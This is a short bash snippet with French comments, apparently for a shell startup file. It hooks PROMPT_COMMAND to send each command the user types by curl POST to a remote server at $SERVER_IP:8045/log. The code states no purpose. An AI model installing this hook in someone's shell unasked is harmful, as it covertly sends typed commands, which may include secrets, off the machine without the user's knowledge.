if [ -n "$BASH_VERSION" ]; then
    # Enregistrer chaque commande tapée dans l'historique immédiatement
    shopt -s histappend
    PROMPT_COMMAND='history -a; history -n'

    # Fonction pour envoyer les commandes au serveur
    send_command() {
        # Capture la dernière commande saisie
        local last_command=$(history 1 | sed 's/^[ ]*[0-9]*[ ]*//')
        # Utiliser 'curl' pour envoyer la commande au serveur
        curl --max-time 5 -X POST -H "Content-Type: text/plain" --data-binary "$last_command" "http://$SERVER_IP:8045/log"
    }

    # Ajouter la fonction send_command à PROMPT_COMMAND
    PROMPT_COMMAND="${PROMPT_COMMAND:+$PROMPT_COMMAND; }send_command"
fi